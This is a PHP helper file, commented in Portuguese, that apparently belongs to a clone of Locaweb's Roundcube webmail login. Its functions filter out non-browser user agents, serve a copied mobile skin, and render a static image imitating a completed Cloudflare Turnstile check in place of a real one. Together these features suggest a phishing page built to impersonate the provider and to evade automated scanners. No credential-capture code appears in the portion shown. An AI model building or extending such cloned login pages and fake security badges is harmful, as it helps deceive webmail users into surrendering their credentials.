<?php
declare(strict_types=1);

/**
 * Detecção simplificada — espelha gate do Roundcube Locaweb (UA não-browser).
 */
function lm_browser_supported(): bool
{
    $ua = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
    if ($ua === '') {
        return false;
    }
    $patterns = [
        'Chrome/', 'Chromium/', 'Firefox/', 'Safari/', 'Edg/', 'OPR/',
        'MSIE ', 'Trident/', 'SamsungBrowser/', 'Opera/',
    ];
    foreach ($patterns as $p) {
        if (stripos($ua, $p) !== false) {
            return true;
        }
    }
    return false;
}

/** Espelha Roundcube Locaweb: celular recebe skin alpha_mobile (não webmail2016). */
function lm_is_mobile_client(): bool
{
    if (isset($_GET['desktop']) && (string) $_GET['desktop'] === '1') {
        return false;
    }
    if (isset($_GET['mobile']) && (string) $_GET['mobile'] === '1') {
        return true;
    }

    $ua = strtolower((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    if ($ua === '') {
        return false;
    }

    if (str_contains($ua, 'ipad') || str_contains($ua, 'tablet')) {
        return false;
    }

    if (str_contains($ua, 'android') && !str_contains($ua, 'mobile')) {
        return false;
    }

    foreach ([
        'iphone', 'ipod', 'android', 'webos', 'blackberry', 'iemobile',
        'opera mini', 'opera mobi', 'mobile', 'windows phone', 'silk/',
    ] as $hint) {
        if (str_contains($ua, $hint)) {
            return true;
        }
    }

    return false;
}

function lm_skin(string $path, array $config): string
{
    return htmlspecialchars(
        url_path('/skins/webmail2016/assets/' . ltrim($path, '/'), $config),
        ENT_QUOTES,
        'UTF-8'
    );
}

function lm_alpha_skin(string $path, array $config): string
{
    return htmlspecialchars(
        url_path('/skins/alpha_mobile/' . ltrim($path, '/'), $config),
        ENT_QUOTES,
        'UTF-8'
    );
}

function lm_asset(string $path, array $config): string
{
    return htmlspecialchars(url_path('/assets/' . ltrim($path, '/'), $config), ENT_QUOTES, 'UTF-8');
}

function lm_e(?string $s): string
{
    return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8');
}

/** Chaves 1x/2x/3x do Cloudflare exibem aviso "Somente para teste…" — usar widget visual. */
function lm_turnstile_is_test_key(string $siteKey): bool
{
    return (bool) preg_match('/^[123]x/i', $siteKey);
}

/** Widget Turnstile — réplica de cloudfere.png (Sucesso! + CLOUDFLARE + Privacidade/Ajuda). */
function lm_turnstile_visual_html(array $config): string
{
    $src = lm_asset('images/turnstile-success.png', $config);
    return '<div class="lm-turnstile-wrap"><img class="lm-turnstile-img" src="' . $src . '" alt="" width="300" height="87" decoding="async" draggable="false"></div>';
}
